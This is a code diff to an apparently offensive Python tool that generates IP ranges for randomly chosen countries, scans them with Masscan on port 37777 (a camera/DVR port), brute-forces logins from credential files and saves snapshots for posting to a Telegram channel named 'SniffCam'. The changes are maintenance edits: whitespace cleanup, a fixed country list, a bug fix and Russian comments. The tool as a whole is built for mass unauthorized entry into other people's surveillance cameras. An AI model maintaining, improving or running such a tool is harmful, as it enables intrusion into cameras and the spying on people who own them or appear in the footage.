@@ -123,11 +123,11 @@ def get_args():
     parser.add_argument('-s', dest='scan_file',
                         help='file with IP ranges to scan, e.g. 192.168.1.1-192.168.11.1')
     parser.add_argument('-p', dest='ports',
-                        help='ports to scan (default: 37777), e.g. 37777,37778')                    
+                        help='ports to scan (default: 37777), e.g. 37777,37778')
     parser.add_argument('-b', dest='brute_file',
                         help='file with IPs to brute, in any format')
     parser.add_argument('-l', dest='use_custom_credentials', action='store_true', default=False,
-                        help=f'brute combinations from {config.logins_file} and {config.passwords_file} instead of {config.logopass_file}')                  
+                        help=f'brute combinations from {config.logins_file} and {config.passwords_file} instead of {config.logopass_file}')
     parser.add_argument('-m', '--masscan', dest='brute_only', action="store_false", default=True,
                         help='run Masscan and brute the results')
     parser.add_argument('-t', dest='threads', default=str(config.default_masscan_threads),
@@ -149,13 +149,16 @@ def get_args():
 
     if len(sys.argv) < 2:
         parser.print_help()
-        sys.exit()                 
+        sys.exit()
     args = parser.parse_args()
+
+    # Список названий стран, гарантированно поддерживаемых countrycode
+    stable_countries = ['United States', 'Brazil', 'Germany', 'France', 'Italy', 'Poland', 'Spain', 'Turkey', 'Ukraine']
 
     country = ''
     city = ''
     count = 0
-    
+
     config.snapshots_enabled = args.snapshots_enabled
 
     if args.ports:
@@ -174,9 +177,9 @@ def get_args():
         total_range = []
 
         while config.max_ips < count:
-            country = random.choice(countrycode.data['country_name'])
+            country = random.choice(stable_countries)
             for stored_c in list(dict.fromkeys(config.random_countries)):
-                if country is stored_c:
+                if country == stored_c:
                    continue
             locator = IPDenyGeolocationToIP(country, city)
             try:
@@ -187,14 +190,17 @@ def get_args():
             total_range += range_list
             slash = ['|', '/', ' ', '-']
             print(f'Searching for a bright-day ip-ranges {random.choice(slash)}', end='\r')
-            time.sleep(2) # spell from ban
+            time.sleep(2) # Защита от бана (spell from ban)
             for cidr in range_list:
                 count2 = IPDenyGeolocationToIP.get_cidr_count(cidr)
                 total_count += count2
             config.max_ips = total_count
         else:
              config.logging.info('Generated %s IPs from %s' % (total_count, list(dict.fromkeys(config.random_countries))))
-             config.global_country = random.choice(config.random_countries)
+             if config.random_countries:
+                 config.global_country = random.choice(config.random_countries)
+             else:
+                 config.global_country = country
              file = open(config.tmp_masscan_file, 'w')
              file.write("\n".join(total_range))
              file.close()
@@ -204,7 +210,7 @@ def get_args():
         args.brute_only = False
         country = input('Enter country name (defaut random): ')
         if not country:
-            country = random.choice(countrycode.data['country_name'])
+            country = random.choice(stable_countries)
             print('Selected %s' % country)
         config.global_country = country
         city = input('Enter city name (default none): ')
@@ -246,7 +252,7 @@ def get_args():
 def main():
     init()
     print(Figlet(font='slant').renderText('asleep'))
-    print('https://t.me/asleep_cg\n')
+    print('https://t.me/SniffCam\n')
 
     args = get_args()
     if args.debug:
@@ -270,7 +276,7 @@ def main():
     TOKEN = '' # Bot Token
     SNAPSHOT_DIR = Path.cwd() / config.snapshots_folder
     """ delete=True removes snapshots after posting """
-    #poster = Poster(SNAPSHOT_DIR, TOKEN, ROOM_ID, delete=False) 
+    #poster = Poster(SNAPSHOT_DIR, TOKEN, ROOM_ID, delete=False)
     #poster.start()  ### Start posting function
 
     if Path(config.snapshots_folder).exists():
